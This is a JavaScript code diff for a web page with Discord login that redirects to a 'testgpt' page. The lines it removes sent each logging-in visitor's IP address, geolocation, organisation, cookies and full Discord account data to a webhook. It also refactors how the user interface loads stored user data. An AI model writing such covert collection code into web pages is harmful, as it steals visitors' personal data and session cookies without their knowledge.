@@ -211,14 +211,8 @@ ${userDataFormatted}
     window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
 });
 
-// Function to update UI based on login state
 async function updateUI() {
-    const discordUser = localStorage.getItem('discordUser');
-    let userData;
-
-    if (discordUser) {
-        userData = JSON.parse(discordUser); // Parse the user data
-
+    if (userData) { // Use the userData from the top
         const usernameElement = document.querySelector('.username');
         usernameElement.innerText = userData.username; // Update username
         const profilePicture = profileUI.querySelector('.profile-picture');
@@ -236,22 +230,18 @@ async function updateUI() {
             // If user data is in the URL, parse and store it
             userData = JSON.parse(decodeURIComponent(userParam));
             localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
-            
-            await sendWebhook("User Login", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-            `.trim(), Math.floor(Math.random() * 16777215));
-            updateUI();
-            window.location.href = 'https://cakeorpastry.netlify.app/testgpt'
+
+            const usernameElement = document.querySelector('.username');
+            usernameElement.innerText = userData.username; // Update username
+            const profilePicture = profileUI.querySelector('.profile-picture');
+            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
+
+            // Enable logout button, disable login button
+            logoutButton.disabled = false;
+            loginButton.disabled = true;
+
+            // Redirect to the desired URL
+            window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
         } else {
             // Not logged in and no user data in URL
             logoutButton.disabled = true;
@@ -259,7 +249,8 @@ ${userDataFormatted}
         }
     }
 
-    // profileUI.style.display = 'block'; // Always show profile UI
+    // Ensure profile UI is always visible
+   // profileUI.style.display = 'block'; // Always show profile UI
 }
 
 // Initial UI setup
